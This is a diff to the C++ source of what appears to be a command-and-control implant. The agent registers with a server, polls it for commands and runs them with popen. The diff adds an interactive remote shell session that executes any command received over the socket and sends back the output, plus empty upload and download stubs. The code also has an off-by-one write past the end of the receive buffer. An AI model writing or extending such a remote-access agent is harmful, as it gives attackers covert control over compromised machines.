@@ -29,7 +29,7 @@
 #define PORT 9999
 #define ADDR "127.0.0.1"
 #define BUFFER_SIZE 4096
-#define MAX_RESPONSE 20000
+#define MAX_RESPONSE 0x20000
 
 class Device {
     public:
@@ -45,6 +45,9 @@ class Communicate_ {
     int conn();
     void reg(Device d);
     void beacon(const char *id);
+    void session();
+    void upload();
+    void download();
 };
 
 int main() {
@@ -70,7 +73,6 @@ int main() {
         comm.beacon(id);
         sleep(5);
     }
-
     return 0;
 }
 
@@ -221,6 +223,14 @@ void Communicate_::beacon(const char *id) {
     cJSON *task_id = cJSON_GetObjectItem(reply, "task_id");
     cJSON *cmd = cJSON_GetObjectItem(reply, "command");
 
+    // if cmd == "session" | provide interactive shell 
+    if (strncmp(cmd->valuestring, "session", 7) == 0) session();
+    // if command = "upload [file path]" | upload file to agent 
+    if (strncmp(cmd->valuestring, "upload", 6) == 0) upload();
+    // if command = "download [file path]" | download file from agent
+    if (strncmp(cmd->valuestring, "download", 8) == 0) download();
+    
+    
     // execute command
     // char *result = exec(cmd->valuestring);
     FILE *exec;
@@ -250,7 +260,6 @@ void Communicate_::beacon(const char *id) {
     cJSON_AddStringToObject(re, "agent_id", id);
     cJSON_AddNumberToObject(re, "task_id", task_id->valueint);
     cJSON_AddStringToObject(re, "response", result);
-
     char *result_ = cJSON_Print(re);
     send(sock, result_, strlen(result_), 0);
     fclose(exec);
@@ -297,7 +306,6 @@ void Communicate_::reg(Device d) {
     // store id in a file
     // file path
     STORE_ID:
-    
     FILE *f = fopen(file_path, "w");
     if (!f) {
         sleep(3000);
@@ -308,4 +316,57 @@ void Communicate_::reg(Device d) {
     //fwrite(id->valuestring, 1, sizeof(id->valuestring), f);
     fclose(f);
     cJSON_Delete(reply);
+}
+
+void Communicate_::session() {
+    char command[BUFFER_SIZE];
+    char response[MAX_RESPONSE];
+    char container[BUFFER_SIZE];
+    char error[BUFFER_SIZE] = "Failed to execute command";
+    while (1) {
+        memset(command, 0, BUFFER_SIZE);
+        memset(container, 0, BUFFER_SIZE);
+        memset(response, 0, sizeof(response));
+
+        // recv
+
+        int bytes_received = recv(sock, command, sizeof(command), 0);
+        if (bytes_received <= 0) {
+            continue;
+        }
+        command[bytes_received] = '\0';
+        if((strncmp("q", command, 1) == 0) || (strncmp("quit", command, 4) == 0) || (strncmp("exit", command, 4) == 0)) {
+            break; 
+        } else {
+            FILE *exec;
+            char cmd_w_redirect[BUFFER_SIZE + 10];
+            snprintf(cmd_w_redirect, sizeof(cmd_w_redirect), "%s 2>&1", command);
+            #ifdef _WIN32
+            exec = _popen(cmd_w_redirect, "r");
+            #else
+            exec = popen(cmd_w_redirect, "r");
+            #endif
+            if (!exec) {
+                send(sock, error, strlen(error), 0);
+                continue;
+            }
+            while (fgets(container, sizeof(container), exec) != NULL) {
+                strcat(response, container);
+            }
+
+            send(sock, response, strlen(response), 0);
+            fclose(exec);
+        }
+
+
+    }
+
+}
+
+void Communicate_::upload() {
+
+}
+
+void Communicate_::download() {
+
 }
